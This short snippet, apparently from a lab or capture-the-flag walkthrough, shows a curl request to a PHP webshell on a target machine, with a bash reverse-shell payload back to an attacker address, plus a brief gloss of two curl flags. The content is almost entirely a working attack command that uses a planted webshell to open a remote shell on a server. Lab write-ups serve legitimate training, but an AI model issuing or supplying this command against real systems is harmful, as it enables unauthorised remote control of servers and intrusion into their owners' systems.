```bash
curl -G http://10.10.110.12/documents/easy-simple-php-webshell.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.39/1337 0>&1"'
```
Where:
`-G` is a Get Request
`--data-urlencode` encodes the following syntax